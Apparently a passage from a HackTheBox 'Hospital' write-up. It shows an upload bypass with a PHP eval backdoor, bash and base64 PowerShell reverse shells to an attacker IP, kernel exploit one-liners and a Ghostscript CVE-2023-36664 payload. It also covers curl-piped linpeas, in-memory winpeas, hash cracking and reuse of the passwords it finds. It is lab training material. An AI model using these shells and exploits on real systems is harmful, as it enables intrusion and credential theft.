└─$ feroxbuster -t 150 -o ferox_8080.txt -u 'http://hospital.htb:8080/'

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://hospital.htb:8080/
 🚀  Threads               │ 150
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_8080.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://hospital.htb:8080/ => login.php
301      GET        9l       28w      316c http://hospital.htb:8080/js => http://hospital.htb:8080/js/
301      GET        9l       28w      317c http://hospital.htb:8080/css => http://hospital.htb:8080/css/
301      GET        9l       28w      320c http://hospital.htb:8080/images => http://hospital.htb:8080/images/
301      GET        9l       28w      319c http://hospital.htb:8080/fonts => http://hospital.htb:8080/fonts/
301      GET        9l       28w      321c http://hospital.htb:8080/uploads => http://hospital.htb:8080/uploads/
301      GET        9l       28w      320c http://hospital.htb:8080/vendor => http://hospital.htb:8080/vendor/
301      GET        9l       28w      328c http://hospital.htb:8080/vendor/animate => http://hospital.htb:8080/vendor/animate/
```


# User Flag
---

## Enum


### Username brute force

- `drwilliams`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ kerbrute userenum -d hospital.htb --dc DC.hospital.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/21/23 - Ronnie Flathers @ropnop

2023/11/21 19:28:52 >  Using KDC(s):
2023/11/21 19:28:52 >   DC.hospital.htb:88

2023/11/21 19:29:34 >  [+] VALID USERNAME:       administrator@hospital.htb
2023/11/21 19:33:50 >  [+] VALID USERNAME:       Administrator@hospital.htb
2023/11/21 23:23:24 >  [+] VALID USERNAME:       drwilliams@hospital.htb
```

Not asreproastable

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ GetNPUsers.py hospital.htb/ -usersfile kerbrute.txt -format hashcat
Impacket v0.12.0.dev1+20231108.130828.33058eb - Copyright 2023 Fortra

[-] User drwilliams doesn't have UF_DONT_REQUIRE_PREAUTH set
```

### 8080 - File upload

There's not much info from smb and port 443, no usernames gathered

The only thing interesting for initial access was file upload function at port `8080`

![](/assets/obsidian/4a82020f5b09fc5b7968a0a609b887cc.png)

There's a possible path : `/uploads/` where files will be uploaded to

![](/assets/obsidian/5193efbb07d1c18174f3355af7ee3ee9.png)

This is the response after uploading `.jpg` files

![](/assets/obsidian/00ddfddb3c56ec554fae757bfb32ef0c.png)

The response for `.php` file

![](/assets/obsidian/891418d12bb5a94a31c597685ffa9dd4.png)

It redirects to `/failed.php` or `/success.php` after uploads

Changing the mime type doesn't bypass the check

## Shell as www-data

### File upload bypass at port 8080

> **Common methods for file upload bypass**
> - [Extensions](https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology)
> - Content-Type (Wordlist for fuzzing : `/usr/share/seclists/Miscellaneous/web/content-type.txt`)
> - Magic bytes (`echo "89 50 4e 47 0d 1a 0a" | xxd -p -r > rev.php`)
{: .prompt-tip }

Fuzz working php file extensions

Upload a file through burp proxy and save it

![](/assets/obsidian/534ac12b8e4015e9025a422262782145.png)

Change the keyword to `FUZZ` for `ffuf` to recognize

![](/assets/obsidian/91ad6579e8f4a5fb4bec910959106727.png)

Used the [wordlist from PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)

```bash
ffuf -c --request-proto http -request upload.req -w '/opt/sectools/cheatsheet/!/PayloadsAllTheThings/Upload Insecure Files/Extension PHP/extensions.lst' -fr '/success.php' -o ffuf.json
```

Output success URLs

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ cat ffuf.json | jq '.results[].input.FUZZ' -r | tee success_files.txt
.php%00.png
.php\x00.gif
.php\x00.png
.phpt
.pht
.php%00.jpg
.phtm
.php%00.gif
.php\x00.jpg
.phar
.pgif
```

Check URLs

```bash
ffuf -c --request-proto http -u "http://hospital.htb:8080/uploads/xFUZZ" -w success_files.txt -v
```

![](/assets/obsidian/d8102ed1d3b465c201eae1075151e0af.png)

`http://hospital.htb:8080/uploads/x.phar` is the only one that have a large size, which means it's working

From `phpinfo` result, it's running on linux

![](/assets/obsidian/7791cbee41e7ad8cbe47548d9529acf7.png)

### disable_functions bypass

The `disable_functions` will make most webshells fail

![](/assets/obsidian/6b63062a2919f41d76637e352ec5db22.png)

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,system,shell_exec,exec,proc_open,preg_replace,passthru,curl_exec
```

Since it doesn't block `eval()`, I'll use **phpsploit**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ phpsploit --interactive --eval "set PASSKEY HTB; exploit"
...
[*] 26 plugins correctly loaded
[*] Current backdoor is: <?php @eval($_SERVER['HTTP_HTB']); ?>

To run a remote tunnel, the backdoor shown above must be
manually injected in a remote server executable web page.
Then, use `set TARGET <BACKDOORED_URL>` and run `exploit`.
phpsploit >
```

Upload the shell

![](/assets/obsidian/b0e121473ff4345da269c87d40a26eea.png)

```bash
phpsploit > set TARGET http://hospital.htb:8080/uploads/.cache.phar
phpsploit > exploit
[*] Current backdoor is: <?php @eval($_SERVER['HTTP_HTB']); ?>

[*] Sending payload to http://hospital.htb:8080/uploads/.cache.phar ...
[*] Shell obtained by PHP (10.10.16.30 -> 192.168.5.2)

Connected to Linux server (hospital.htb)
running PHP 7.4.33 on Apache/2.4.55 (Ubuntu)
phpsploit(hospital.htb) > run id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Get a shell

```bash
phpsploit(hospital.htb) > run 'bash -c "bash -i >& /dev/tcp/10.10.16.30/1111 0>&1"'
```

```bash
┌──(bravosec㉿fsociety)-[/usr/share/phpsploit]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.224.71] 6576
bash: cannot set terminal process group (914): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/html/uploads$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ds$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@webserver:/var/www/html/uploads$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[/usr/share/phpsploit]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

www-data@webserver:/var/www/html/uploads$ export TERM=xterm
www-data@webserver:/var/www/html/uploads$
```

## From www-data to root

### Enum

There is a user `drwilliams` (`Lucy Williams`)

```bash
www-data@webserver:/var/www/html$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
```

We're on a VM but not in container, guess it's `HyperV` or `WSL`

![](/assets/obsidian/7f1551f545119129af52d3f4f7abc4c3.png)

We can ping the host machine and get TTL with `128`, 

```bash
www-data@webserver:/var/www/html/uploads$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:00:8a:02 brd ff:ff:ff:ff:ff:ff
    inet 192.168.5.2/24 brd 192.168.5.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fe00:8a02/64 scope link
       valid_lft forever preferred_lft forever
www-data@webserver:/var/www/html/uploads$ ping 192.168.5.1
ping 192.168.5.1
PING 192.168.5.1 (192.168.5.1) 56(84) bytes of data.
64 bytes from 192.168.5.1: icmp_seq=1 ttl=128 time=0.572 ms
64 bytes from 192.168.5.1: icmp_seq=2 ttl=128 time=0.523 ms
...
```


### Crack hashes from user table in mysql database

Found mysql credentials

```bash
www-data@webserver:/var/www/html$ grep -rin passw
```

![](/assets/obsidian/bfb3eadfa168fd240e5c27d3b943b726.png)

```bash
www-data@webserver:/var/www/html$ cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

Enumerate database

```bash
www-data@webserver:/var/www/html$ mysql -uroot -p'my$qls3rv1c3!'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 9
Server version: 10.11.2-MariaDB-1 Ubuntu 23.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.


MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hospital           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.006 sec)

MariaDB [(none)]> use hospital;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [hospital]> show tables;
+--------------------+
| Tables_in_hospital |
+--------------------+
| users              |
+--------------------+
1 row in set (0.000 sec)

MariaDB [hospital]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
+----+----------+--------------------------------------------------------------+---------------------+
2 rows in set (0.005 sec)
```

Extract data from users table to **hashcat** format

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ cat users.table
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
+----+----------+--------------------------------------------------------------+---------------------+

┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ cat users.table|awk '{print $4":"$6}'
:
username:password
:
admin:$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2
patient:$2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO
:

┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ vi users.hash
admin:$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2
patient:$2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ hashcat users.hash /opt/wordlists/rockyou.txt --user -m 3200
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ hashcat users.hash /opt/wordlists/rockyou.txt --user -m 3200 --show
admin:$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2:123456
patient:$2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO:patient
```

> Tried the passwords and `mysql` root password for all users on the machine, none of them worked

### Attempt kerbrute

No new users gathered

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ cat ad_usersnames.txt
Lucy Williams

┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ /opt/sectools/misc/username-anarchy/username-anarchy -i ad_usersnames.txt > ad_users.txt

┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ cat mysql_users_table.txt
admin
patient
root
drwilliams

┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ cat mysql_users_table.txt ad_users.txt > users.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ kerbrute userenum -d hospital.htb --dc DC.hospital.htb users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/21/23 - Ronnie Flathers @ropnop

2023/11/21 23:42:49 >  Using KDC(s):
2023/11/21 23:42:49 >   DC.hospital.htb:88

2023/11/21 23:42:50 >  [+] VALID USERNAME:       drwilliams@hospital.htb
2023/11/21 23:42:50 >  Done! Tested 18 usernames (1 valid) in 0.476 seconds
```

> The only valid username we got for AD was `drwilliams`, need to find a way to get its password

### 0day Kernel Exploit (GameOverlay)

> [[HackTheBox Writeup - Analytics#Root Flag#From metalytics to root#0day Kernel Exploit (GameOverlay)]]

- Vulnerable Ubuntu kernel versions : `6.2.0`, `5.19.0`, `5.4.0`
- Invulnerable Ubuntu kernel versions : `5.15.0`

This linux VM meets the condition

```bash
www-data@webserver:/var/www/html/uploads$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=23.04
DISTRIB_CODENAME=lunar
DISTRIB_DESCRIPTION="Ubuntu 23.04"
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
VERSION="23.04 (Lunar Lobster)"
VERSION_CODENAME=lunar
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=lunar
LOGO=ubuntu-logo
www-data@webserver:/var/www/html/uploads$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

Use my oneliner (https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/commit/bc88beaf75a094e9c0dd6c809c7e6711a0aa847b)

```bash
www-data@webserver:/var/www/html/uploads$ export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);d=os.getenv("TD");os.system(f"rm -rf {d}");os.chdir("/root");os.system("/bin/sh")'

# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

# Root Flag
---

## From root on VM to drbrown on host


### Crack drwilliams's password from shadow file

Run linpeas to help gather credentials

```bash
root@webserver:/root# curl 10.10.16.30/linpeas.sh|bash
```

The only secret related to `drwilliams` was the hash from shadow files

```bash
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

```powershell
> .\hashcat.exe H:\VM-Share\Kali\shadow H:\VM-Share\Kali\rockyou.txt
> .\hashcat.exe H:\VM-Share\Kali\shadow H:\VM-Share\Kali\rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

...

$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
```

### Login to Hospital Webmail

> https://hospital.htb/

Login success with : `drwilliams`:`qwe123!@#`

![](/assets/obsidian/7b10bd4569e93993158cdfed1cb35ede.png)

There's one mail asking for `drwilliams` (Lucy Williams) to send back a design file with `.eps` extension, then the file will be processed with **ghostsrcipt**

![](/assets/obsidian/1ec64e3e04cd243c3d1b3dd0adb6ef61.png)

> **What is an EPS file?**
> EPS is a [vector file format](https://www.adobe.com/creativecloud/file-types/image/vector.html) often required for professional and high-quality image printing. PostScript printers and image setters typically use EPS to produce vast, detailed images
{: .prompt-info }

By clicking at `About`, we know it's using `Roundcube Webmail 1.6.4`

![](/assets/obsidian/1f2a3afbcc6926df5926e65380cbbd33.png)

By searching the product version exploit on google, we can see most vulnerabilities were fixed on `1.6.4`

### Ghostscript command injection (CVE-2023-36664)

Google : `ghost script exploit 2023`

> https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection

```bash
git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
cd CVE-2023-36664-Ghostscript-command-injection
```

Craft a payload to ping back

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital/exploit/CVE-2023-36664-Ghostscript-command-injection]
└─$ python3 CVE_2023_36664_exploit.py --generate --payload 'ping 10.10.16.30' --filename test --extension eps
[+] Generated EPS payload file: test.eps
```

Listen for ICMP

```bash
sudo tcpdump -i tun0 icmp -v
```

Reply `Chris Brown` with the eps file

![](/assets/obsidian/475713b8acb3828d42fbee4eea1bd32e.png)

We got command execution

![](/assets/obsidian/88cfc359c46aad0ab348c64235bc014d.png)

By using the `PowerShell #3 (Base64)` payload from https://www.revshells.com/ (And add `-exec bypass` to the arguments), we get a shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital/exploit/CVE-2023-36664-Ghostscript-command-injection]
└─$ python3 CVE_2023_36664_exploit.py --generate --payload 'powershell -exec bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=' --filename final --extension eps
[+] Generated EPS payload file: final.eps
```

![](/assets/obsidian/3f9d4cafdb58e3dd4bf9dc34310bc443.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.241.251] 6012
whoami
hospital\drbrown
```

## From drbrown to domain administrator


### Reverse SSH

**[reverse_ssh](https://github.com/NHAS/reverse_ssh)** can help : secure the connection, fully interactive shell, port forwarding, file transfer... and much more

Start server

```bash
cd /opt/sectools/c2/reverse_ssh/bin && ./server 0.0.0.0:22521
```

On victim :

```bash
(new-object net.webclient).DownloadFile("http://10.10.16.30/win/client.exe", "C:\Programdata\ssh.exe"); C:\Programdata\ssh.exe -d 10.10.16.30:22521
```

List clients

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh/bin]
└─$ ssh 127.0.0.1 -p 22521 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 9fada0b979e7aecebeecdcff03817a558a8c01f5 | SSH-v2.2.3-windows_amd64 |
| 6e867dd1ca01b0045c1489aeb0680e37a1ad0129 |                          |
| hospital.drbrown.dc                      |                          |
| 10.129.241.251:6085                      |                          |
+------------------------------------------+--------------------------+
```

Connect to client

```bash
ssh -J 127.0.0.1:22521 hospital.drbrown.dc
```

```bash
PS C:\Users\drbrown.HOSPITAL\Documents> cat ..\Desktop\user.txt
738fca36a5f95639b5f66561ec6c6436
```

### Enum

```bash
PS C:\Users\drbrown.HOSPITAL\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
hospital\drbrown S-1-5-21-4208260710-2273545631-1523135639-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Log Users               Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

#### drbrown's creds in batch script

Found `drbrown`'s password `chr!$br0wn` from `C:\Users\drbrown.HOSPITAL\Documents\ghostscript.bat`

```bash
PS C:\Users\drbrown.HOSPITAL\Documents> ls -Force | sort LastWriteTime -Descending


    Directory: C:\Users\drbrown.HOSPITAL\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a-hs-       10/27/2023  12:24 AM            402 desktop.ini
-a----       10/23/2023   3:33 PM            373 ghostscript.bat
d--hsl         9/6/2023   5:54 AM                My Videos
d--hsl         9/6/2023   5:54 AM                My Pictures
d--hsl         9/6/2023   5:54 AM                My Music
```

```bash
PS C:\Users\drbrown.HOSPITAL\Documents> cat .\ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -S
criptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

> `hospital\drbrown`:`chr!$br0wn`

### Domain Administrator's password in python script

Start winpeas

```bash
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://10.10.16.30/win/winpeas.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

There's a schedule task called `OneDriveUpdate` which runs a python script

![](/assets/obsidian/d9eecf54888a68bd2de93898b96e8bd4.png)

It's an automation script that opens `https://localhost` in browser then login as `Administrator`

```bash
PS C:\Users\drbrown.HOSPITAL\Documents> cat C:\Windows\System32\SyncAppvPublicationServer.vbs
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import pyautogui
import time

pyautogui.FAILSAFE = False
driver = webdriver.Ie()
driver.maximize_window()
try:
        driver.get('https://localhost')
        time.sleep(3)
        driver.find_element('id', 'moreInfoContainer').click()
        time.sleep(3)
        driver.find_element('id', 'overridelink').click()
        time.sleep(3)
        user_box = WebDriverWait(driver, 10).until(EC.presence_of_element_located(('id', 'rcmloginuser')))
        user_box_xy = user_box.location
        pass_box = driver.find_element('id', 'rcmloginpwd')
        pass_box_xy = pass_box.location
        while True:
                user_box.clear()
                user_box.click()
                pyautogui.typewrite('Administrator', interval=1.3)
                time.sleep(3)
                pass_box.clear()
                pass_box.click()
                pyautogui.typewrite("Th3B3stH0sp1t4l9786!", interval=1.3)
                time.sleep(117)
finally:
        driver.quit()
```

Password reuse

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ cme winrm hospital.htb -u 'Administrator' -p 'Th3B3stH0sp1t4l9786!'
SMB         10.129.241.251  5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:hospital.htb)
HTTP        10.129.241.251  5985   DC               [*] http://10.129.241.251:5985/wsman
HTTP        10.129.241.251  5985   DC               [+] hospital.htb\Administrator:Th3B3stH0sp1t4l9786! (Pwn3d!)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ cme winrm hospital.htb -u 'Administrator' -p 'Th3B3stH0sp1t4l9786!' -X 'cat C:\Users\Administrator\Desktop\root.txt'
SMB         10.129.241.251  5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:hospital.htb)
HTTP        10.129.241.251  5985   DC               [*] http://10.129.241.251:5985/wsman
HTTP        10.129.241.251  5985   DC               [+] hospital.htb\Administrator:Th3B3stH0sp1t4l9786! (Pwn3d!)
HTTP        10.129.241.251  5985   DC               [+] Executed command
HTTP        10.129.241.251  5985   DC               bb7f2097c76039721fdbafb75e5643fd
```

# Additional
---

## Privilege escalation on Ubuntu VM via CVE-2023-35001

> https://github.com/synacktiv/CVE-2023-35001

> Affected kernel versions : `v3.13-rc1` <= Linux Kernel < `v6.5-rc2`
{: .prompt-info }

```bash
mkdir -p www && cd www
git clone https://github.com/synacktiv/CVE-2023-35001
cd CVE-2023-35001
make
cd ..
tar -cvf exp.tar CVE-2023-35001
python -m http.server 80
```

```bash
www-data@webserver:/tmp$ wget 10.10.16.30/exp.tar
www-data@webserver:/tmp$ tar -xf exp.tar
www-data@webserver:/tmp$ cd CVE-2023-35001/
